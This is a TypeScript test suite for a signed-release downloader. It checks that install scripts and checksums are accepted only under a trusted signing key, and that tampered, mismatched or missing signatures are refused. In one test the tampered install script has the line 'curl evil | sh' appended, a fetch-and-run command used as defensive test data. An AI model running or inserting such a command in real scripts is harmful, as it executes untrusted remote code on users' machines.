import { describe, expect, it } from 'vitest'
import {
  CHECKSUMS,
  downloadSigned,
  INSTALL_SCRIPT,
  signedChecksums,
  signedRelease,
  SignedReleaseError,
} from './signed-release'
import { keyPair, releasesFetch, signatureOf, signedFiles } from './testing/releases'

const release = keyPair()
const nextRelease = keyPair()
const stranger = keyPair()
const keys = [release.raw, nextRelease.raw]

const SCRIPT = '#!/bin/sh\necho installing\n'
const SUMS = `${'a'.repeat(64)}  kettu-daemon-linux-x64.tar.gz\n`
const DOWNLOADS = 'https://download.example'
const GITHUB = 'https://github.example/releases'

const files = (key = release.privateKey) =>
  signedFiles('0.2.0', { [INSTALL_SCRIPT]: SCRIPT, [CHECKSUMS]: SUMS }, key)

function deps(places: Parameters<typeof releasesFetch>[0]) {
  const { fetch, requests } = releasesFetch(places)
  return { requests, deps: { fetch, userAgent: 'test', keys } }
}

describe('signed release files', () => {
  it('takes the install script and the checksums signed with the release key', async () => {
    const { deps: d } = deps({ [DOWNLOADS]: { latest: '0.2.0', files: files() } })
    await expect(signedRelease(d, DOWNLOADS, '0.2.0')).resolves.toEqual({
      script: SCRIPT,
      checksums: SUMS,
    })
  })

  it('takes a signature under the next release key too', async () => {
    const { deps: d } = deps({
      [DOWNLOADS]: { latest: '0.2.0', files: files(nextRelease.privateKey) },
    })
    await expect(downloadSigned(d, DOWNLOADS, '0.2.0', CHECKSUMS)).resolves.toEqual(
      Buffer.from(SUMS),
    )
  })

  it('refuses a signature made with another key', async () => {
    const { deps: d } = deps({
      [DOWNLOADS]: { latest: '0.2.0', files: files(stranger.privateKey) },
    })
    await expect(downloadSigned(d, DOWNLOADS, '0.2.0', CHECKSUMS)).rejects.toThrow(/does not hold/)
    await expect(signedRelease(d, DOWNLOADS, '0.2.0')).rejects.toBeInstanceOf(SignedReleaseError)
  })

  it('refuses a file changed after it was signed', async () => {
    const served = files()
    served[`0.2.0/${INSTALL_SCRIPT}`] = `${SCRIPT}curl evil | sh\n`
    const { deps: d } = deps({ [DOWNLOADS]: { latest: '0.2.0', files: served } })
    await expect(downloadSigned(d, DOWNLOADS, '0.2.0', INSTALL_SCRIPT)).rejects.toThrow(
      /does not hold/,
    )
  })

  it('refuses a signature made for another file name', async () => {
    const served = files()
    // The checksums served with the install script's signature, and the other way round.
    served[`0.2.0/${CHECKSUMS}.sig`] = signatureOf(INSTALL_SCRIPT, SUMS, release.privateKey)
    served[`0.2.0/${INSTALL_SCRIPT}.sig`] = signatureOf(CHECKSUMS, SCRIPT, release.privateKey)
    const { deps: d } = deps({ [DOWNLOADS]: { latest: '0.2.0', files: served } })
    await expect(downloadSigned(d, DOWNLOADS, '0.2.0', CHECKSUMS)).rejects.toThrow(/does not hold/)
    await expect(downloadSigned(d, DOWNLOADS, '0.2.0', INSTALL_SCRIPT)).rejects.toThrow(
      /does not hold/,
    )
  })

  it('refuses a release with no signature, saying so', async () => {
    const served = files()
    delete served[`0.2.0/${CHECKSUMS}.sig`]
    const { deps: d } = deps({ [DOWNLOADS]: { latest: '0.2.0', files: served } })
    await expect(downloadSigned(d, DOWNLOADS, '0.2.0', CHECKSUMS)).rejects.toThrow(
      /sha256sums\.txt\.sig: it answered 404.*before its install files were signed/,
    )
  })

  it('refuses a place that does not answer', async () => {
    const { deps: d } = deps({})
    await expect(downloadSigned(d, DOWNLOADS, '0.2.0', CHECKSUMS)).rejects.toThrow(
      /Could not download/,
    )
  })
})

describe('the checksums from the first place that signs them', () => {
  it('moves on from a place whose signature does not hold, or is missing', async () => {
    const bad = files(stranger.privateKey)
    const none = files()
    delete none[`0.2.0/${CHECKSUMS}.sig`]
    const { deps: d, requests } = deps({
      [DOWNLOADS]: { latest: '0.2.0', files: bad },
      'https://mirror.example': { latest: '0.2.0', files: none },
      [GITHUB]: { latest: '0.2.0', files: files() },
    })
    const places = [DOWNLOADS, 'https://mirror.example', GITHUB]
    await expect(signedChecksums(d, places, '0.2.0')).resolves.toBe(SUMS)
    expect(requests.filter((url) => url.startsWith(GITHUB))).toHaveLength(2)
  })

  it('rejects with every place reason when none signs them', async () => {
    const { deps: d } = deps({
      [DOWNLOADS]: { latest: '0.2.0', files: files(stranger.privateKey) },
      [GITHUB]: { latest: '0.2.0', files: {} },
    })
    const failure = await signedChecksums(d, [DOWNLOADS, GITHUB], '0.2.0').catch((e: Error) => e)
    expect(failure).toBeInstanceOf(SignedReleaseError)
    expect((failure as Error).message).toMatch(/No place served signed checksums/)
    expect((failure as Error).message).toContain(`${DOWNLOADS}/download/v0.2.0/${CHECKSUMS}`)
    expect((failure as Error).message).toContain(`${GITHUB}/download/v0.2.0/${CHECKSUMS}`)
  })

  it('stops at once when the user cancels, without trying the next place', async () => {
    const cancelled = new Error('cancelled')
    const aborting = new AbortController()
    aborting.abort(cancelled)
    let asked = 0
    const fetchAborted = ((_url: string, init: RequestInit) => {
      asked++
      return Promise.reject(init.signal?.reason)
    }) as typeof fetch
    const d = { fetch: fetchAborted, userAgent: 'test', keys, signal: aborting.signal }
    await expect(signedChecksums(d, [DOWNLOADS, GITHUB], '0.2.0')).rejects.toBe(cancelled)
    expect(asked).toBe(1)
  })
})
